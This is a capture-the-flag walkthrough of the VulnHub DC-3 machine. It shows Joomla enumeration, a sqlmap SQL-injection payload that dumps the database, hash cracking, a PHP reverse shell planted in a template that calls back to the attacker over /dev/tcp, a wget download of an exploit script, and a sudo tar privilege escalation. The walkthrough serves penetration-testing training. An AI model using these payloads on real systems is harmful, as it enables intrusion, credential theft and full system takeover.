# DC-3 Writeup

## Machine Information

| Machine | DC-3 |
|---|---|
| Platform | VulnHub |
| Difficulty | Easy / Intermediate |
| OS | Linux |

---

# Objective

- Gain access to the target machine
- Enumerate services
- Exploit the web application
- Gain reverse shell access
- Perform privilege escalation
- Capture the final flag

---

# Attacker Machine

| Role | IP Address |
|---|---|
| Kali Linux | 192.168.28.125 |

# Target Machine

| Role | IP Address |
|---|---|
| DC-3 | 192.168.29.235 |

---

# Step 1 — Verify Connectivity

Ping the target machine.

```bash
ping TARGET_IP
```

---

# Step 2 — Nmap Enumeration

Perform a full port and service scan.

```bash
nmap -sC -sV -Pn TARGET_IP
```

Example findings:

- Port 80 open
- Apache Web Server
- Joomla CMS detected

---

# Step 3 — Browse the Website

Open the target in browser.

```bash
http://TARGET_IP
```

Check the page source and identify technologies used.

---

# Step 4 — Joomla Enumeration

Use WhatWeb to fingerprint the website.

```bash
whatweb TARGET_IP
```

Use Joomla scanner.

```bash
joomscan -u http://TARGET_IP
```

Possible result:

- Joomla Version Discovered
- Vulnerable Joomla installation

---

# Step 5 — Search for Exploit

Search for Joomla exploit locally.

```bash
searchsploit joomla
```

Copy the exploit locally.

```bash
searchsploit -m 42033
```

---

# Step 6 — SQL Injection Exploitation

Run the exploit.

```bash
python3 42033.py
```

Or manually exploit with sqlmap.

```bash
sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,user()),0)" --dbs
```

Dump database contents.

```bash
sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,user()),0)" --dump
```

---

# Step 7 — Crack Joomla Credentials

Save the password hash and crack it.

```bash
john hash.txt
```

Possible credentials obtained:

```text
admin:snoopy
```

---

# Step 8 — Login to Joomla Admin Panel

Visit:

```bash
http://TARGET_IP/administrator
```

Login using the cracked credentials.

---

# Step 9 — Upload Reverse Shell

Navigate to:

```text
Extensions → Templates → Templates
```

Edit a PHP file and insert PHP reverse shell.

Kali listener:

```bash
nc -lvnp 4444
```

PHP reverse shell:

```php
<?php system("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1'"); ?>
```

Save the file and trigger it from browser.

---

# Step 10 — Stabilize Shell

Spawn a proper TTY shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell.

```bash
CTRL + Z
```

Fix terminal.

```bash
stty raw -echo
fg
```

Export terminal settings.

```bash
export TERM=xterm
```

---

# Step 11 — Enumerate for Privilege Escalation

Check sudo permissions.

```bash
sudo -l
```

Check kernel version.

```bash
uname -a
```

Search for SUID binaries.

```bash
find / -perm -4000 2>/dev/null
```

---

# Step 12 — Download Linux Exploit Suggester

Navigate to writable directory.

```bash
cd /tmp
```

On Kali machine:

```bash
python3 -m http.server 8000
```

On target machine:

```bash
wget http://YOUR_KALI_IP:8000/linux-exploit-suggester.sh
```

Give execute permission.

```bash
chmod +x filename.sh
```

Run the script.

```bash
./filename.sh
```

---

# Step 13 — Privilege Escalation

Use the discovered exploit or misconfiguration.

Example:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

Root shell obtained.

Verify:

```bash
whoami
```

Expected output:

```text
root
```

---

# Step 14 — Capture the Flag

Navigate to root directory.

```bash
cd /root
```

Read the flag.

```bash
cat theflag.txt
```

---

# Root Access Achieved

```text
Privilege Escalation Successful
```

---

# Tools Used

- Nmap
- WhatWeb
- JoomScan
- Searchsploit
- SQLMap
- John The Ripper
- Netcat
- Linux Exploit Suggester

---

# Skills Learned

- Web Enumeration
- Joomla Exploitation
- SQL Injection
- Password Cracking
- Reverse Shell Handling
- Linux Privilege Escalation

---

# Machine Completed

```text
DC-3 Successfully Owned

The MAchine is completed by sabareesh cv
```

